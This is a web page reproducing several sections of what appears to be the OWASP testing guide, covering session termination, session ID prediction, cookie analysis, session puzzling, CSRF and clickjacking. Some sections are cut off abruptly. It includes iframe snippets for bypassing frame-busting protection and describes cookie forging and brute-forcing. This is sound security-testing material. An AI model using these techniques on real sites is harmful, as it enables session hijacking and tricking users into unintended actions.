      <p>The usage of a single sign-on (SSO) system instead of an application-specific authentication scheme often causes the coexistence of multiple sessions which have to be terminated separately. For instance, the termination of the application-specific session does not terminate the session in the SSO system. Navigating back to the SSO portal offers the user the possibility to log back in to the application where the log out was performed just before. On the other side a log out function in a SSO system does not necessarily cause session termination in connected applications.</p>

      <h3 id="testing-for-log-out-user-interface">Testing for Log Out User Interface</h3>
      <p>Verify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.</p>
      <blockquote>
      <p>There are some properties which indicate a good log out user interface:</p>
      <ul>
      <li>A log out button is present on all pages of the web application.</li>
      <li>The log out button should be identified quickly by a user who wants to log out from the web application.</li>
      <li>After loading a page the log out button should be visible without scrolling.</li>
      <li>Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.</li>
      </ul>
      </blockquote>
      <h3 id="testing-for-server-side-session-termination">Testing for Server-Side Session Termination</h3>
      <p>First, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don&rsquo;t show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.</p>
      <blockquote>
      <p>No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.</p>
      </blockquote>
      <h3 id="testing-for-session-timeout">Testing for Session Timeout</h3>
      <p>Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.</p>
      <blockquote>
      <p>The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.</p>
      <p>The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.</p>
      </blockquote>
      <h3 id="testing-for-session-termination-in-single-sign-on-environments-single-sign-off">Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)</h3>
      <p>Perform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.</p>
      <blockquote>
      <p>It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.</p>

      <h4>Concurrent sessions are a common aspect of web applications that enable multiple simultaneous user interactions. This test case aims to evaluate the application&rsquo;s ability to handle multiple active sessions for a single user. This functionality is essential for effectively managing concurrent user sessions, particularly in sensitive areas such as admin panels containing Personally Identifiable Information (PII), personal user accounts, or APIs reliant on third-party services to enrich user-provided data. The primary objective is to ensure that concurrent sessions align with the application&rsquo;s security requirements.</h4>
      <p>Understanding the security needs in an application is key to assessing whether enabling concurrent sessions corresponds with the intended features. Allowing concurrent sessions isn&rsquo;t inherently detrimental and is intentionally permitted in many applications. However, it is crucial to ensure that the application&rsquo;s functionality is effectively aligned with its security measures concerning concurrent sessions. If concurrent sessions are intended, it is vital to ensure additional security controls, such as managing active sessions, terminating sessions, and potential new session notifications. Conversely, if concurrent sessions are not intended or planned within the application, it is crucial to validate existing checks for session management vulnerabilities.</p>
      <p>To recognize that concurrent sessions are essential, you should consider the following factors:</p>
      <ul>
      <li>Understanding the application&rsquo;s nature, particularly situations where users might require simultaneous access from different locations or devices.</li>
      <li>Identifying critical operations, such as financial transactions that require secure access.</li>
      <li>Handling sensitive data like Personally Identifiable Information (PII), indicating the necessity for secure interactions.</li>

        <h4>The session prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application.</h4>
        <p>In the first step, the attacker needs to collect some valid session ID values that are used to identify authenticated users. Then, they must understand the structure of session ID, the information that is used to create it, and the encryption or hash algorithm used by application to protect it. Some bad implementations use sessions IDs composed by username or other predictable information, like timestamp or client IP address. In the worst case, this information is used in clear text or coded using some weak algorithm like base64 encoding.</p>
        <p>In addition, the attacker can implement a brute force technique to generate and test different values of session ID until they successfully get access to the application.</p>
        <h2 id="examples">Examples</h2>
        <p>The session ID information for a certain application is normally composed by a string of fixed width. Randomness is very important to avoid its prediction. Looking at the example in Figure 1, the session ID variable is represented by JSESSIONID and its value is &ldquo;user01&rdquo;, which corresponds to the username. By trying new values for it, like &ldquo;user02&rdquo;, it could be possible to get inside the application without prior authentication.</p>

        </br>
  
    <h4>One of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.</h4>
    <p>In this test, the tester wants to check that cookies and other session tokens are created in a secure and unpredictable way. An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users.</p>
    <p>Cookies are used to implement session management and are described in detail in RFC 2965. In a nutshell, when a user accesses an application which needs to keep track of the actions and identity of that user across multiple requests, a cookie (or cookies) is generated by the server and sent to the client. The client will then send the cookie back to the server in all following connections until the cookie expires or is destroyed. The data stored in the cookie can provide to the server a large spectrum of information about who the user is, what actions he has performed so far, what his preferences are, etc. therefore providing a state to a stateless protocol like HTTP.</p>
    <p>A typical example is provided by an online shopping cart. Throughout the session of a user, the application must keep track of his identity, his profile, the products that he has chosen to buy, the quantity, the individual prices, the discounts, etc. Cookies are an efficient way to store and pass this information back and forth (other methods are URL parameters and hidden fields).</p>
    <p>Due to the importance of the data that they store, cookies are therefore vital in the overall security of the application. Being able to tamper with cookies may result in hijacking the sessions of legitimate users, gaining higher privileges in an active session, and in general influencing the operations of the application in an unauthorized way.</p>
    <p>In this test the tester has to check whether the cookies issued to clients can resist a wide range of attacks aimed to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be able to forge a cookie that will be considered valid by the application and that will provide some kind of unauthorized access (session hijacking, privilege escalation, &hellip;).</p>
    <p>Usually the main steps of the attack pattern are the following:</p>

    <li><strong>cookie collection</strong>: collection of a sufficient number of cookie samples;</li>
    <li><strong>cookie reverse engineering</strong>: analysis of the cookie generation algorithm;</li>
    <li><strong>cookie manipulation</strong>: forging of a valid cookie in order to perform the attack. This last step might require a large number of attempts, depending on how the cookie is created (cookie brute-force attack).</li>
    </ul>
    <p>Another pattern of attack consists of overflowing a cookie. Strictly speaking, this attack has a different nature, since here testers are not trying to recreate a perfectly valid cookie. Instead, the goal is to overflow a memory area, thereby interfering with the correct behavior of the application and possibly injecting (and remotely executing) malicious code.</p>
    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Gather session tokens, for the same user and for different users where possible.</li>
    <li>Analyze and ensure that enough randomness exists to stop session forging attacks.</li>
    <li>Modify cookies that are not signed and contain information that can be manipulated.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <h3 id="black-box-testing-and-examples">Black-Box Testing and Examples</h3>
    <p>All interaction between the client and application should be tested at least against the following criteria:</p>
    <ul>
    <li>Are all <code class="language-plaintext highlighter-rouge">Set-Cookie</code> directives tagged as <code class="language-plaintext highlighter-rouge">Secure</code>?</li>
    <li>Do any Cookie operations take place over unencrypted transport?</li>
    <li>Can the Cookie be forced over unencrypted transport?</li>
    <li>If so, how does the application maintain security?</li>
    <li>Are any Cookies persistent?</li>
    <li>What <code class="language-plaintext highlighter-rouge">Expires</code> times are used on persistent cookies, and are they reasonable?</li>
    <li>Are cookies that are expected to be transient configured as such?</li>
    <li>What HTTP/1.1 <code class="language-plaintext highlighter-rouge">Cache-Control</code> settings are used to protect Cookies?</li>
    <li>What HTTP/1.0 <code class="language-plaintext highlighter-rouge">Cache-Control</code> settings are used to protect Cookies?</li>
    </ul>
    <h4 id="cookie-collection">Cookie Collection</h4>
    <p>The first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:</p>
    <ul>
    <li>
    <p>How many cookies are used by the application?</p>
    <p>Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.</p>
    </li>
    <li>
    <p>Which parts of the application generate or modify the cookie?</p>
    <p>Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?</p>
    </li>
    <li>
    <p>Which parts of the application require this cookie in order to be accessed and utilized?</p>
    <p>Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.</p>
    </li>
    </ul>
    <p>A spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.</p>
    <h4 id="session-analysis">Session Analysis</h4>
    <p>The session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.</p>
    <ul>
    <li>Token Structure &amp; Information Leakage</li>
    </ul>
    <p>The first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.</p>
    <p>If the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as <code class="language-plaintext highlighter-rouge">192.168.100.1:owaspuser:password:15:58</code>.</p>
    <p>If part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string <code class="language-plaintext highlighter-rouge">192.168.100.1:owaspuser:password:15:58</code> is represented in hex, base64, and as an MD5 hash:</p>
    <ul>
    <li>Hex: <code class="language-plaintext highlighter-rouge">3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538</code></li>
    <li>Base64: <code class="language-plaintext highlighter-rouge">MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=</code></li>
    <li>MD5: <code class="language-plaintext highlighter-rouge">01c2fc4f0a817afd8366689bd29dd40a</code></li>
    </ul>
    <p>Having identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.</p>
    <p>Hybrid tokens may include information such as IP address or User ID together with an encoded portion, such as <code class="language-plaintext highlighter-rouge">owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412</code>.</p>
    <p>Having analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user &ndash; e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.</p>
    <p>If static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.</p>
    <p>The following areas should be addressed during the single and multiple Session ID structure testing:</p>
    <ul>
    <li>What parts of the Session ID are static?</li>
    <li>What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses</li>
    <li>What easily decoded confidential information is stored?</li>
    <li>What information can be deduced from the structure of the Session ID?</li>
    <li>What portions of the Session ID are static for the same log in conditions?</li>
    <li>What obvious patterns are present in the Session ID as a whole, or individual portions?</li>
    </ul>
    <h4 id="session-id-predictability-and-randomness">Session ID Predictability and Randomness</h4>
    <p>Analysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions &ndash; e.g., the same username, password, and IP address.</p>
    <p>Time is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.</p>
    <p>Variable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are seemingly random, one-way hashes of time or other environmental variations should be considered as a possibility. Typically, the result of a cryptographic hash is a decimal or hexadecimal number so should be identifiable.</p>
    <p>In analyzing Session ID sequences, patterns or cycles, static elements and client dependencies should all be considered as possible contributing elements to the structure and function of the application.</p>
    <ul>
    <li>Are the Session IDs provably random in nature? Can the resulting values be reproduced?</li>
    <li>Do the same input conditions produce the same ID on a subsequent run?</li>
    <li>Are the Session IDs provably resistant to statistical or cryptanalysis?</li>
    <li>What elements of the Session IDs are time-linked?</li>
    <li>What portions of the Session IDs are predictable?</li>
    <li>Can the next ID be deduced, given full knowledge of the generation algorithm and previous IDs?</li>
    </ul>
    <h4 id="cookie-reverse-engineering">Cookie Reverse Engineering</h4>
    <p>Now that the tester has enumerated the cookies and has a general idea of their use, it is time to have a deeper look at cookies that seem interesting. Which cookies is the tester interested in? A cookie, in order to provide a secure method of session management, must combine several characteristics, each of which is aimed at protecting the cookie from a different class of attacks.</p>
    <p>These characteristics are summarized below:</p>
    <ol>
    <li>Unpredictability: a cookie must contain some amount of hard-to-guess data. The harder it is to forge a valid cookie, the harder is to break into legitimate user&rsquo;s session. If an attacker can guess the cookie used in an active session of a legitimate user, they will be able to fully impersonate that user (session hijacking). In order to make a cookie unpredictable, random values or cryptography can be used.</li>
    <li>Tamper resistance: a cookie must resist malicious attempts of modification. If the tester receives a cookie like <code class="language-plaintext highlighter-rouge">IsAdmin=No</code>, it is trivial to modify it to get administrative rights, unless the application performs a double check (for instance, appending to the cookie an encrypted hash of its value)</li>
    <li>Expiration: a critical cookie must be valid only for an appropriate period of time and must be deleted from the disk or memory afterwards to avoid the risk of being replayed. This does not apply to cookies that store non-critical data that needs to be remembered across sessions (e.g., site look-and-feel).</li>
    <li><code class="language-plaintext highlighter-rouge">Secure</code> flag: a cookie whose value is critical for the integrity of the session should have this flag enabled in order to allow its transmission only in an encrypted channel to deter eavesdropping.</li>
    </ol>
    <p>The approach here is to collect a sufficient number of instances of a cookie and start looking for patterns in their value. The exact meaning of &ldquo;sufficient&rdquo; can vary from a handful of samples, if the cookie generation method is very easy to break, to several thousands, if the tester needs to proceed with some mathematical analysis (e.g., chi-squares, attractors. See later for more information).</p>
    <p>It is important to pay particular attention to the workflow of the application, as the state of a session can have a heavy impact on collected cookies. A cookie collected before being authenticated can be very different from a cookie obtained after the authentication.</p>
    <p>Another aspect to keep into consideration is time. Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie (the server could use a timestamp as part of the cookie value). The time recorded could be the local time or the server&rsquo;s timestamp included in the HTTP response (or both).</p>
    <p>When analyzing the collected values, the tester should try to figure out all variables that could have influenced the cookie value and try to vary them one at the time. Passing to the server modified versions of the same cookie can be very helpful in understanding how the application reads and processes the cookie.</p>
    <p>Examples of checks to be performed at this stage include:</p>
    <ul>
    <li>What character set is used in the cookie? Has the cookie a numeric value? alphanumeric? hexadecimal? What happens if the tester inserts in a cookie characters that do not belong to the expected charset?</li>
    <li>Is the cookie composed of different sub-parts carrying different pieces of information? How are the different parts separated? With which delimiters? Some parts of the cookie could have a higher variance, others might be constant, others could assume only a limited set of values. Breaking down the cookie to its base components is the first and fundamental step.</li>
    </ul>
    <p>An example of an easy-to-spot structured cookie is the following:</p>
    <div class="language-text highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q
    </code></pre>
    </div>
    </div>
    <p>This example shows 5 different fields, carrying different types of data:</p>
    <ul>
    <li>ID &ndash; hexadecimal</li>
    <li>CR &ndash; small integer</li>
    <li>TM and LM &ndash; large integer. (And curiously they hold the same value. Worth to see what happens modifying one of them)</li>
    <li>S &ndash; alphanumeric</li>
    </ul>
    <p>Even when no delimiters are used, having enough samples can help understand the structure.</p>
    <h4 id="brute-force-attacks">Brute Force Attacks</h4>
    <p>Brute force attacks inevitably lead on from questions relating to predictability and randomness. The variance within the Session IDs must be considered together with application session duration and timeouts. If the variation within the Session IDs is relatively small, and Session ID validity is long, the likelihood of a successful brute-force attack is much higher.</p>
    <p>A long Session ID (or rather one with a great deal of variance) and a shorter validity period would make it far harder to succeed in a brute force attack.</p>
    <ul>
    <li>How long would a brute-force attack on all possible Session IDs take?</li>
    <li>Is the Session ID space large enough to prevent brute forcing? For example, is the length of the key sufficient when compared to the valid life-span?</li>
    <li>Do delays between connection attempts with different Session IDs mitigate the risk of this attack?</li>
    </ul>
    <h3 id="gray-box-testing-and-example">Gray-Box Testing and Example</h3>
    <p>If the tester has access to the session management schema implementation, they can check for the following:</p>
    <ul>
    <li>
    <p>Random Session Token</p>
    <p>The Session ID or Cookie issued to the client should not be easily predictable (don&rsquo;t use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).</p>
    </li>
    <li>
    <p>Token length</p>
    <p>Session ID will be at least 50 characters length.</p>
    </li>
    <li>
    <p>Session Time-out</p>
    <p>Session token should have a defined time-out (it depends on the criticality of the application managed data)</p>
    </li>
    <li>
    <p>Cookie configuration:</p>
    <ul>
    <li>non-persistent: only RAM memory</li>
    <li>secure (set only on HTTPS channel): <code class="language-plaintext highlighter-rouge">Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure</code></li>
    <li><a href="https://owasp.org/www-community/HttpOnly">HTTPOnly</a> (not readable by a script): <code class="language-plaintext highlighter-rouge">Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly</code></li>

        </br>
       
        <h4>Session Variable Overloading (also known as Session Puzzling) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:</h4>
        <ul>
        <li>Bypass efficient authentication enforcement mechanisms, and impersonate legitimate users.</li>
        <li>Elevate the privileges of a malicious user account, in an environment that would otherwise be considered foolproof.</li>
        <li>Skip over qualifying phases in multi-phase processes, even if the process includes all the commonly recommended code level restrictions.</li>
        <li>Manipulate server-side values in indirect methods that cannot be predicted or detected.</li>
        <li>Execute traditional attacks in locations that were previously unreachable, or even considered secure.</li>
        </ul>
        <p>This vulnerability occurs when an application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.</p>
        <p>For example, an attacker could use session variable overloading to bypass authentication enforcement mechanisms of applications that enforce authentication by validating the existence of session variables that contain identity&ndash;related values, which are usually stored in the session after a successful authentication process. This means an attacker first accesses a location in the application that sets session context and then accesses privileged locations that examine this context.</p>
        <p>For example - an authentication bypass attack vector could be executed by accessing a publicly accessible entry point (e.g. a password recovery page) that populates the session with an identical session variable, based on fixed values or on user originating input.</p>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>
        <li>Identify all session variables.</li>
        <li>Break the logical flow of session generation.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <h3 id="black-box-testing">Black-Box Testing</h3>
        <p>This vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid. In particular this is possible by accessing a sequence of entry points and then examining exit points. In case of black-box testing this procedure is difficult and requires some luck since every different sequence could lead to a different result.</p>
        <h4 id="examples">Examples</h4>
        <p>A very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.</p>
        <h3 id="gray-box-testing">Gray-Box Testing</h3>
        <p>The most effective way to detect these vulnerabilities is via a source code review.</p>

    <sl-details summary="CSRF" open>

    <h1 id="testing-for-cross-site-request-forgery">Testing for Cross Site Request Forgery</h1>

    
    <h4>Cross-Site Request Forgery (<a href="https://owasp.org/www-community/attacks/csrf">CSRF</a>) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker&rsquo;s choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.</h4>

    <p>CSRF relies on:</p>

    <ol>

    <li>Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.</li>

    <li>An attacker&rsquo;s knowledge of valid web application URLs, requests, or functionality.</li>

    <li>Application session management relying only on information known by the browser.</li>

    <li>Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag <code class="language-plaintext highlighter-rouge">img</code>.</li>

    </ol>

    <p>Points 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.</p>

    <ol>

    <li>Browsers automatically send information used to identify a user session. Suppose <em>site</em> is a site hosting a web application, and the user <em>victim</em> has just authenticated to <em>site</em>. In response, <em>site</em> sends <em>victim</em> a cookie that identifies requests sent by <em>victim</em> as belonging to <em>victim&rsquo;s</em> authenticated session. Once the browser receives the cookie set by <em>site</em>, it will automatically send it along with any further requests directed to <em>site</em>.</li>

    <li>If the application does not make use of session-related information in URLs, then the application URLs, their parameters, and legitimate values may be identified. This may be accomplished by code analysis or by accessing the application and taking note of forms and URLs embedded in the HTML or JavaScript.</li>

    <li>&ldquo;Known by the browser&rdquo; refers to information such as cookies or HTTP-based authentication information (such as Basic Authentication and not form-based authentication), that are stored by the browser and subsequently present at each request directed towards an application area requesting that authentication. The vulnerabilities discussed next apply to applications that rely entirely on this kind of information to identify a user session.</li>

    </ol>

    <p>For simplicity&rsquo;s sake, consider GET-accessible URLs (though the discussion applies as well to POST requests). If <em>victim</em> has already authenticated themselves, submitting another request causes the cookie to be automatically sent with it. The figure below illustrates the user accessing an application on <code class="language-plaintext highlighter-rouge">www.example.com</code>.</p>

    <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/images/Session_riding.GIF" alt="Session Riding" /><br /> <em>Figure 4.6.5-1: Session Riding</em></p>

    <p>The GET request could be sent by the user in several different ways:</p>

    <ul>

    <li>Using the web application</li>

    <li>Typing the URL directly in the browser</li>

    <li>Following an external link that points to the URL</li>

    </ul>

    <p>These invocations are indistinguishable by the application. In particular, the third may be quite dangerous. There are a number of techniques and vulnerabilities that can disguise the real properties of a link. The link can be embedded in an email message, appear in a malicious site to which the user is lured, or appear in content hosted by a third-party (such as another site or HTML email) and point to a resource of the application. If the user clicks on the link, since they are already authenticated by the web application on <em>site</em>, the browser will issue a GET request to the web application, accompanied by authentication information (the session ID cookie). This results in a valid operation being performed on the web application that the user does not expect; for example, a funds transfer on a web banking application.</p>

      <sl-details summary="Testing for clickjacking" open>
        <h1 id="testing-for-clickjacking">Testing for Clickjacking</h1>
     </br>
      <h4>Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.</h4>
      <p>A clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client side security issue that affects a variety of browsers and platforms.</p>
      <p>To carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker&rsquo;s target website.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/images/Clickjacking_description.png" alt="Clickjacking illustration" /><br /> <em>Figure 4.11.9-1: Clickjacking inline frame illustration</em></p>
      <p>The victim surfs the attacker&rsquo;s web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.</p>
      <p><img src="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/images/Masked_iframe.png" alt="Masked inline frame illustration" /><br /> <em>Figure 4.11.9-2: Masked inline frame illustration</em></p>
      <p>The power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.</p>
      <h3 id="how-to-test">How to Test</h3>
      <p>As mentioned above, this type of attack is often designed to allow an attacker to induce users&rsquo; actions on the target site, even if anti-CSRF tokens are being used. Testing should be conducted to determine if website pages are vulnerable to clickjacking attacks.</p>
      <p>Testers may investigate if a target page can be loaded in an inline frame by creating a simple web page that includes a frame containing the target web page. An example of HTML code to create this testing web page is displayed in the following snippet:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
          <span class="nt">&lt;head&gt;</span>
              <span class="nt">&lt;title&gt;</span>Clickjack test page<span class="nt">&lt;/title&gt;</span>

      <p>If the <code class="language-plaintext highlighter-rouge">http://www.target.site</code> page is successfully loaded into the frame, then the site is vulnerable and has no type of protection against clickjacking attacks.</p>
      <h3 id="bypass-clickjacking-protection">Bypass Clickjacking Protection</h3>
      <p>If the <code class="language-plaintext highlighter-rouge">http://www.target.site</code> page does not appear in the inline frame, the site probably has some form of protection against clickjacking. It&rsquo;s important to note that this isn&rsquo;t a guarantee that the page is totally immune to clickjacking.</p>
      <p>Methods to protect a web page from clickjacking can be divided into a few main mechanisms. It is possible to bypass these methods in some circumstances by employing specific workarounds. For further OWASP resources on clickjacking defense, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html">OWASP Clickjacking Defense Cheat Sheet</a>.</p>
      <h4 id="client-side-protection-frame-busting">Client Side Protection: Frame Busting</h4>
      <p>The most common client side method, that has been developed to protect a web page from clickjacking, is called Frame Busting and it consists of a script in each page that should not be framed. The aim of this technique is to prevent a site from functioning when it is loaded inside a frame.</p>
      <p>The structure of frame busting code typically consists of a &ldquo;conditional statement&rdquo; and a &ldquo;counter-action&rdquo; statement. For this type of protection, there are some work arounds that fall under the name of &ldquo;Bust frame busting&rdquo;. Some of this techniques are browser-specific while others work across browsers.</p>
      <h5 id="mobile-website-version">Mobile Website Version</h5>
      <p>Mobile versions of the website are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants have often less protection since there is the wrong assumption that an attacker could not attack an application by the smart phone. This is fundamentally wrong, because an attacker can fake the real origin given by a web browser, such that a non-mobile victim may be able to visit an application made for mobile users. From this assumption follows that in some cases it is not necessary to use techniques to evade frame busting when there are unprotected alternatives, which allow the use of same attack vectors.</p>
      <h5 id="double-framing">Double Framing</h5>
      <p>Some frame busting techniques try to break frame by assigning a value to the &ldquo;parent.location&rdquo; attribute in the &ldquo;counter-action&rdquo; statement.</p>
      <p>Such actions are, for example:</p>
      <ul>
      <li>self.parent.location = document.location</li>
      <li>parent.location.href = self.location</li>
      <li>parent.location = self.location</li>
      </ul>
      <p>This method works well until the target page is framed by a single page. However, if the attacker encloses the target web page in one frame which is nested in another one (a double frame), then trying to access to &ldquo;parent.location&rdquo; becomes a security violation in all popular browsers, due to the descendant frame navigation policy. This security violation disables the counter-action navigation.</p>
      <p>Target site frame busting code (target site):</p>
      <div class="language-javascript highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="o">!=</span><span class="nb">self</span><span class="p">.</span><span class="nx">locaton</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">parent</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nb">self</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
      <span class="p">}</span>
      </code></pre>
      </div>
      </div>
      <p>Attacker&rsquo;s top frame (fictitious2.html):</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"fictitious.html"</span><span class="nt">&gt;</span>
      </code></pre>
      </div>
      </div>
      <p>Attacker&rsquo;s fictitious sub-frame (fictitious.html):</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://target site"</span><span class="nt">&gt;</span>
      </code></pre>
      </div>
      </div>
      <h5 id="disabling-javascript">Disabling JavaScript</h5>
      <p>Since these type of client side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.</p>
      <p>There are three deactivation techniques that can be used with frames:</p>
      <ul>
      <li>Restricted frames with Internet Explorer: Starting from Internet Explorer 6, a frame can have the &ldquo;security&rdquo; attribute that, if it is set to the value &ldquo;restricted&rdquo;, ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.</li>
      </ul>
      <p>Example:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://target site"</span> <span class="na">security=</span><span class="s">"restricted"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
      </code></pre>
      </div>
      </div>
      <ul>
      <li>Sandbox attribute: with HTML5 there is a new attribute called &ldquo;sandbox&rdquo;. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.</li>
      </ul>
